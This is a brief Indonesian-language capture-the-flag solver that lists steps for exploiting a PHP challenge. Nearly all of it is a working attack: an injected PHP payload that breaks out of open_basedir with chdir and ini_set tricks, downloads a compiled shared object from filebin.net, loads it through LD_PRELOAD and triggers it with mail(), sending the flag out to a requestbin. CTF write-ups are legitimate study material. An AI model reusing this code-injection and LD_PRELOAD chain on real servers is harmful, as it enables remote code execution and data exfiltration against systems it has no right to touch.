# Solver
- Buat requestbin
- Buat payload.c (sesuaikan dengan url requestbin)
- Compile payload.c dengan ini: `gcc -shared -fPIC payload.c -o payload.so`
- Masukkan payload berikut: `1); chdir("assets/");ini_set("open_basedir", "/var/www/html:../");chdir("../");chdir("../");chdir("../");chdir("../");file_put_contents('tmp/bjir.so', file_get_contents('https://filebin.net/s9q2nn4jh03kby4p/payload.so?t=wj6zly9n'));putenv("LD_PRELOAD=/tmp/bjir.so");mail("a@localhost","","","",""); #`
- Cek hasilnya di requestbin untuk mendapat flag